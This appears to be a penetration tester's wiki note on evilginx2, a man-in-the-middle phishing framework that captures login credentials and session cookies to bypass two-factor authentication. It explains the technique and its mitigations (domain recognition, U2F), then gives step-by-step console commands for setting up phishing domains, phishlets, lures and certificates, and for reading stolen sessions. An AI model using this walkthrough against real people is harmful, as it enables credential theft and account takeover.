## [evilginx2](https://github.com/kgretzky/evilginx2)

> A man-in-the-middle attack framework used for phishing **login credentials** along with **session cookies**, which in turn allows to **bypass 2-factor authentication protection**. This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website. Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use (from the Github).

---

## How Does It Work?

`evilginx2` is pretty genius.

Before `evilginx` and `evilginx2`, attackers attempting to phish a user's login credentials would clone the target login page and host it on a domain with a similar domain name to the target's. When the user clicked on the link in the phishing email, they were brought to the cloned login page. If the user entered their login credentials, they would be logged by the attacker and perhaps redirected somewhere. This is essentially what [[gophish#Landing Pages|gophish's landing pages]] are.

However, 2FA completely thwarts this strategy because the static, cloned website isn't capable of generating authentic 2FA codes to the user.

`evilginx` and `evilginx2` employ a different strategy. Instead of hosting a static, cloned version of the target login page, the attacker hosts `evilginx2`. When the user clicks on the link in the phishing email, they are brought to `evilginx2` who proceeds to man-in-the-middle the login traffic between the user and the legitimate login page. As a result, `evilginx2` not only captures the login credentials but also facilitates the 2FA process and captures the resultant session cookie, allowing the attacker to completely bypass 2FA.

This technique also has the **major** advantage of not requiring attacker's to deal with cloning the legitimate login form, which can be tedious and error-prone.

---

## How Can This Be Mitigated?

This technique is pretty powerful. What's its achilles heel?

### Domain Name Recognition

The domain name. It still requires attackers to register and use a [[target-research-for-phishing#Domain Name Research|deceptively similar domain name]]. This technique is mitigated when defensive software doesn't allow the user to access the phony domain or the user themself recognizes and doesn't visit the phony domain name.

### Universal 2nd Factor (U2F)

[[u2f|U2F]] thwarts `evilginx2`'s technique because it is designed to take the website's domain name as one of the key components in negotiating the handshake. Since the user isn't actually communicating with the legitimate website, but instead the phony domain name that is hosting `evilginx2`, the handshake will fail. This is a strong mitigation against this technique.

Some security researchers [have found a technique to bypass U2F](https://www.wired.com/story/chrome-yubikey-phishing-webusb/) using the newly implemented WebUSB feature in modern browsers that allows websites to talk with USB-connected devices.

Here's a [[u2f#List of U2F Websites|list of websites that requires U2F authentication]].

---

## Configure for Phishing

You need to configure `evilginx` to work with your domain you are phishing from and its public IP address.

Executing the following commands within `evilginx2`:

```txt
: config domain $PHISHING_DOMAIN
: config ip $PUBLIC_IP_OF_EVILGINX2_HOST
```

- `$PHISHING_DOMAIN` is the domain you are phishing from

---

## Load a Phishlet

```txt
: phishlets hostname $PHISHLET $DOMAIN_NAME
```

- `$PHISHLET` is the name of the phishlet
- `$DOMAIN_NAME` is the phishing domain name that will be in the URL you send in your phishes
	- i.e., `microsoft.phishinglnc.com`

---

## Enable a Phishlet

```txt
: phishlets enable $PHISHLET
```

- `$PHISHLET` is the name of the phishlet

Two significant considerations:

1. If not in [[evilginx2#Developer Mode|developer mode]], this will attempt to generate a TLS certificate for the domain specified when [[evilginx2#Load a Phishlet|loading the phishlet]] via LetsEncrypt. Make sure `evilginx2` is listening on port 80 for this.

2. If not in [[evilginx2#Developer Mode|developer mode]], the certificate generation process will likely fail at first. The error output will show you various URLs that LetsEncrypt is attempting to reach. You'll need to add A records for each of these URLs that point to your server's public IP address.

---

## Generate a Phishing URL

With `evilginx2` properly configured and the desired phishlet loaded and enabled, create a lure for the phishlet.

```txt
: lures create $PHISHLET
```

This will return a lure ID. Retrieve the URl corresponding to the lure.

```txt
: lures get-url $LURE_ID
```

Test the URL in your own browser and make sure `evilginx2` sees the activity.

---

## View Sessions

Whenever a user clicks one of your URLs, it will start a new session. To view these sessions:

```txt
: sessions
```

---

## View Session Data (Credentials)

To view a session's username, password, and token:

```txt
: sessions $SESSION_ID
```

Note that tokens are output in JSON, so you'll need to be using a cookie browser extension that imports cookies as JSON to use it easily (like [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)).

---

## Phishlets

Phishlets are YAML configuration files for each phished site. They define which subdomains are needed to properly proxy to a specific site, what strings should be replaced in relayed packets, which cookies should be captured, and more.

Refer to the following for developing phishlets:
- [Update 2.3 - no more sub_filters](https://breakdev.org/evilginx-2-3-phishermans-dream/)
- [evilginx2 Phishlet Creation](https://mrturvey.co.uk/aiovg_videos/creating-custom-phishlets-for-evilginx2-2fa-bypass/)
- [Kuba explaining the LinkedIn phishlet](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/)
- [Example phishlets](https://github.com/kgretzky/evilginx2/tree/master/phishlets)

---

## Developer Mode

Developing and testing phishlets locally is easier than doing so with a real domain, certificates, and infrastructure. The `-developer` command-line argument can be passed into `evilginx2` when testing phishlets locally. This causes `evilginx2` to automatically generate self-signed certificates rather than attempt to obtain LetsEncrypt certificates. More details on using `evilginx2`'s developer mode can be found in [this blog post](https://breakdev.org/evilginx-2-1-the-first-post-release-update/).

---

## References

[evilginx2 Github Repository](https://github.com/kgretzky/evilginx2)

[Kuba Gretzky - Evilginx 2 - Next Generation of Phishing 2FA Tokens](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/)

[Evilginx 2.1 - The First Post-Release Update](https://breakdev.org/evilginx-2-1-the-first-post-release-update/)
